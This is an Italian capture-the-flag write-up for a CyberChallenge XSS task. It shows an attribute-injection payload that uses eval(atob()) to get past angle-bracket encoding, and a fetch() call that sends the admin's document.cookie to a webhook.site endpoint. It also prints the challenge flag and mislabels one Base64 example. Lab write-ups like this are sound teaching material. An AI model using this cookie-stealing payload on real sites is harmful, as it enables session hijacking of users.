# Writeup: WS_3.03 - XSS Simple 3

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 481  
- **Stato**: Up (last checked: 9 minutes ago)  
- **URL**: [http://xss3.challs.cyberchallenge.it/](http://xss3.challs.cyberchallenge.it/)

## Descrizione 📝
Terza challenge della serie di 5 dedicate all’**XSS**. L’obiettivo rimane ottenere il cookie dell’admin. A differenza dei livelli precedenti, il server sostituisce i caratteri `<` e `>` con le relative entità HTML (`&lt;` e `&gt;`), rendendo inutili i payload più semplici come `<img src="x" onerror="...">`.

## Soluzione 🎯

### 1. Bypass dei Filtri
Poiché i caratteri `<` e `>` vengono sostituiti, non possiamo inserire direttamente tag HTML. Dobbiamo trovare un modo alternativo per eseguire codice JavaScript. Una strategia comune è sfruttare funzioni come `eval()` e `atob()` per decodificare del JavaScript in Base64.

#### Esempio Base64
- `alert(1)` diventa `amF2YXNjcmlwdDphbGVydCgxKQ` in Base64, e può essere eseguito con:
  ```js
  eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'))
  ```
  
### 2. Generazione del Payload Finale
Per esfiltrare il cookie, usiamo `fetch()` verso il nostro webhook. Convertiamo in Base64 la stringa:
```js
fetch('https://webhook.site/7abedc77-d3eb-4ea9-8a94-f613d72088c8', {method: 'POST', body: document.cookie})
```
Supponiamo che la codifica Base64 generi qualcosa come `ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzdhYmVkYzc3LWQzZWItNGVhOS04YTk0LWY2MTNkNzIwODhjOCcsIHttZXRob2Q6ICdQT1NUJywgYm9keTogZG9jdW1lbnQuY29va2llfSkK`.

A questo punto, iniettiamo il payload in un attributo che non viene filtrato, ad esempio `onerror` di un’immagine inesistente, ma senza `<` e `>`:
```
x" onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzdhYmVkYzc3LWQzZWItNGVhOS04YTk0LWY2MTNkNzIwODhjOCcsIHttZXRob2Q6ICdQT1NUJywgYm9keTogZG9jdW1lbnQuY29va2llfSkK'))"
```
Quindi costruiamo l’URL di “report” che verrà inviato all’admin:
```
http://xss3.challs.cyberchallenge.it/?html=x" onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzdhYmVkYzc3LWQzZWItNGVhOS04YTk0LWY2MTNkNzIwODhjOCcsIHttZXRob2Q6ICdQT1NUJywgYm9keTogZG9jdW1lbnQuY29va2llfSkK'))"
```

### 3. Raccolta della Flag
Quando l’admin visita il link, il JavaScript decodificato verrà eseguito e invierà il cookie dell’admin al nostro webhook. Analizzando i log del webhook, otteniamo:

## Flag 🏁
```
CCIT{c5b32a392ba56f4fa3c2e41fa6b89fb5}
```

## Lezioni Apprese 📚
1. **Sanitizzazione Parziale**: Anche se il server converte `<` e `>` in entità HTML, esistono altri vettori per eseguire codice, come `eval(atob())`.  
2. **Base64**: È un metodo efficace per aggirare filtri che bloccano stringhe JavaScript “in chiaro”.  
3. **CSP e Filtri Avanzati**: In sfide reali, potrebbero esserci ulteriori protezioni come `Content-Security-Policy`. Tuttavia, in questa challenge, l’uso di `eval` e `atob` resta possibile.

## Tools Utilizzati 🛠️
- **Browser**: Per testare l’URL generato.  
- **Webhook.site**: Per ricevere il cookie dell’admin.  
- **Base64 Encoder**: Per convertire la stringa JavaScript in Base64.

---

*Writeup by Luca Crippa - Last Updated: 2024*
